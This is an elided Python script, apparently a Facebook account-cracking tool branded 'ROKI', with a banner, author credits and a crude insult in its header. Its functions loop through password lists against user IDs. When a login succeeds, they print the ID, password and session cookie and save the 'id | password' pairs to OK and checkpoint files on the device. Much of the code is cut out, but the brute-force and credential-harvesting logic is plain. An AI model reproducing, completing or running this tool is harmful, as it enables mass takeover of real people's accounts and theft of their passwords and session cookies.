#Dec Created: Nehal901 fuck roki mom
#Created By Mr. 𝐑𝟬𝐊𝟭 
...
logo =f"""\x1b[1;97m
d8888b.  .d88b.  db   dD d888888b    \033[1;34m𝐏 \033[1;37m   
88  `8D .8P  Y8. 88 ,8P'   `88'      \033[1;31m 𝐑\033[1;37m  
88oobY' 88    88 88,8P      88       \033[1;35m𝐎 \033[1;37m  
88`8b   88    88 88`8b      88       \033[1;34m𝐌 \033[1;37m  
88 `88. `8b  d8' 88 `88.   .88.      \033[1;31m 𝐀\033[1;37m 
88   YD  `Y88P'  YP   YD Y888888P    \033[1;35m𝐗 \033[1;37m
𝘽𝘼𝙉𝙂𝙡𝘼𝘿𝙀𝙎𝙃 𝘾𝙔𝘽𝙀𝙍 𝙆𝙄𝙉𝙂 𝙊𝙁𝙁 𝐑𝟬𝐊𝟭
------------------------------------------------------------------------
 Author    : 𝐌𝐑•𝐑𝟬𝐊𝟭
 Github    : ROKI-143-CYBER-KING
 Facebook  : RAKIB HASAN ROKI 
 Tool Type : RANDOM-PRO
 |×| Upgrade Tool To (Premium)
...
def x2():
  ...
  if word in data:
    ...
    print (' Run again : python 𝐑𝟬𝐊𝟭.py')
    exit()
...
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[Roki-RANDOM]--[%s/%s]--[OK-%s]\r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(50*'_')
                print(f"\033[1;92m[Roki-OK] {cid}|{ps} \nCookie : {coki}")
                #print(f' Useragent : {pro}')
                open('/sdcard/𝐑𝟬𝐊𝟭-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[Roki-CP] {cid}|{ps}")
                #print(f' Useragent : {pro}')
                open('/sdcard/𝐑𝟬𝐊𝟭-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print('\r\r\033[1;32m[Roki-OK] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🍪]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [Roki] '+str(ids)+' | '+pas+'\033[1;97m')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Shahin:
                                ...
                                print(f'\r\r\033[1;32m [Roki-OK] %s | %s'%(ids,pas))
                                ...
                                if 'y' in pcp:
                                        print(f'\r\r\033[0;31m [Roki-CP] %s | %s'%(ids,pas))
